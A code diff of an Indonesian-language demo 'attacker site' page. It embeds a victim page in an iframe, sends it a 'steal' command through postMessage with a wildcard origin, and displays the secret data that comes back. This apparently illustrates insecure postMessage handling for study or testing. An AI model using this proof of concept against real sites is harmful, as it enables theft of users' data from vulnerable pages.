@@ -1,27 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head><title>DApp Jahat</title></head>
 <body>
-    <h2>Situs Penyerang</h2>
-    <button onclick="curiData()">Curi Data DApp Korban</button>
-    <div id="hasil" style="margin-top:20px; color:red;"></div>
+    <h3>Situs Penyerang</h3>
+    <button onclick="kirimSerangan()">Curi Data dari Korban</button>
+    <div id="log" style="color:red; margin-top:10px;"></div>
+
+    <iframe id="targetIframe" src="korban.html" style="width:100%; height:150px; border:1px solid black;"></iframe>
 
     <script>
-        function curiData() {
-            // Dalam skenario nyata, penyerang harus tahu window mana yang dituju.
-            // Di sini kita asumsikan window target sudah terbuka.
-            const target = window.open("korban.html");
-
-            setTimeout(() => {
-                // Mengirim perintah ke jendela korban
-                target.postMessage({ action: "getData" }, "*"); 
-            }, 1000);
+        function kirimSerangan() {
+            const iframe = document.getElementById('targetIframe').contentWindow;
+            // Mengirim perintah 'curi' ke iframe korban
+            iframe.postMessage({ action: "curi" }, "*");
+            document.getElementById("log").innerText = "Serangan dikirim...";
         }
 
-        // Menerima data yang dicuri
+        // Menerima data hasil curian
         window.addEventListener("message", (event) => {
-            document.getElementById("hasil").innerText = 
-                "DATA BERHASIL DICURI: " + JSON.stringify(event.data.data);
+            if (event.data.type === "DATA_RAHASIA") {
+                document.getElementById("log").innerText = 
+                    "BERHASIL! Data dicuri: " + JSON.stringify(event.data.data);
+            }
         });
     </script>
 </body>
